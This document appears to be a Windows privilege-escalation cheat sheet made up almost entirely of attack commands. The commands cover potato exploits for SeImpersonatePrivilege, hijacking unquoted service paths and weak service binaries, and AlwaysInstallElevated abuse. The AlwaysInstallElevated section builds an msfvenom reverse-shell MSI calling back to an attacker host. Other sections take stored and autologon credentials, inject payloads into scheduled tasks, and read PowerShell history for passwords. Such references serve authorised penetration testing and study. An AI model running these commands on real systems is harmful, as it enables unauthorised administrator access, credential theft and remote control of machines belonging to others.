# Windows Privilege Escalation

## Token Privileges

```cmd
whoami /priv
:: SeImpersonatePrivilege → PrintSpoofer / GodPotato / JuicyPotato
PrintSpoofer.exe -i -c cmd.exe
GodPotato.exe -cmd "cmd /c whoami"
```

## Unquoted Service Path

```cmd
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"
:: Place payload at the path break: C:\Program Files\Vuln App\service.exe → C:\Program.exe
```

## Weak Service Permissions

```cmd
:: If you can replace the service binary:
sc qc ServiceName                      # check the binary path
icacls "C:\path\to\binary.exe"         # check permissions
:: Replace with your payload, restart service
sc stop ServiceName && sc start ServiceName
```

## AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: If both = 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## Stored Credentials

```cmd
cmdkey /list                           # if credentials are stored:
runas /savecred /user:Administrator cmd.exe
```

## Autologon Credentials

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "Default"
:: DefaultUserName and DefaultPassword in plaintext
```

## Scheduled Tasks

```cmd
schtasks /query /fo list /v | findstr /i "task\|run\|author"
:: Writable script? Inject payload
```

## PowerShell History

```cmd
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
:: Often contains passwords typed in previous sessions
```
